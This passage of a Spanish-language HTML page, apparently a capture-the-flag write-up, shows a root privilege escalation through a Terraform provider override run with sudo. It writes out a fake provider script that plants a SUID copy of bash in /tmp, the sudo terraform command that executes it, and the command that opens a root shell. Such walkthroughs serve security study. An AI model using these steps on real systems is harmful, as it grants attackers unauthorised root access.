+                <p>A continuación, creo el directorio y un binario provider malicioso. El binario debe ser ejecutable y seguir la convención de nombres de Terraform: <code>terraform-provider-{name}</code>:</p>
+                
+                <pre><code class="language-bash">mkdir -p /home/jeremy/malicious_provider</code></pre>
+                
+                <p>Creo un script shell simple que se ejecutará como root:</p>
+                <pre><code class="language-bash">cat > /home/jeremy/malicious_provider/terraform-provider-examples << 'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod 4755 /tmp/rootbash
+EOF
+
+chmod +x /home/jeremy/malicious_provider/terraform-provider-examples</code></pre>
+                
+                <p>Este script creará un binario bash con SUID cuando se ejecute como root.</p>
+                
+                <h3>Ejecutando la Escalada de Privilegios</h3>
+                <p>Ahora exporto la variable de entorno y ejecuto Terraform con sudo:</p>
+                <pre><code class="language-bash">export TF_CLI_CONFIG_FILE="$HOME/.terraformrc"
+sudo /usr/bin/terraform -chdir=/opt/examples init</code></pre>
+                
+                <p><img src="./media/image6.png" alt="Error inicial de terraform mostrando el requerimiento del nombre del binario" /></p>
+                
+                <p>Terraform intenta cargar el provider y valida el nombre del binario. Después de confirmar la convención de nombres correcta, verifico la configuración:</p>
+                <p><img src="./media/image1.png" alt="Terminal mostrando el binario provider con el nombre correcto" /></p>
+                
+                <p>Ejecutando el comando de nuevo:</p>
+                <p><img src="./media/image9.png" alt="Salida de Terraform mostrando que se está usando el override del provider" /></p>
+                
+                <p>El comando se ejecuta exitosamente, y más importante aún, el binario malicioso fue ejecutado como root:</p>
+                <p><img src="./media/image4.png" alt="Terminal mostrando el binario SUID rootbash creado con propiedad de root" /></p>
+                
+                <p>El binario bash con SUID ha sido creado con propiedad de root y el bit setuid configurado. Ahora puedo ejecutarlo para obtener privilegios de root:</p>
+                <pre><code class="language-bash">/tmp/rootbash -p</code></pre>
+                
+                <p>Esto me otorga una shell root, permitiéndome recuperar la flag de root y completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
